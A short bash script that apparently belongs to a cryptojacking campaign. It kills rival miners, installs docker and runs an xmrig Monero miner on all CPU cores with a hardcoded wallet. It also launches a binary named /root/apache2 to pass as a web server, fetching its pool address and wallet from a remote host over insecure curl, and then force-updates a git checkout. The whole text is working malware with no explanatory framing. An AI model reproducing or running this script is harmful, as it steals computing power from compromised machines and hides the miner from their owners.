#!/bin/bash
killall apache2
killall minerd
killall xmrig
desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
apt -y install docker.io
docker run warlax/xmrig-cpu-cryptonightv7 -o xmr-us-east1.nanopool.org:14444 -u 48rbCzbyQLKeHvyAJePqkzN2KuDqNjUCoQkKhYg6mFwvU4kuJXa52ief3D2NKLpjRsALfuqvye8nU5mXrwrjKq318wb1KyV -p `cat index.html` --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l`
/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p `cat index.html` -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
#/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p $desde"-"`cat index.html`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
#nohup /root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"$desde:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &

cd tanhuevon/ ; git stash drop; git reset --hard; git pull
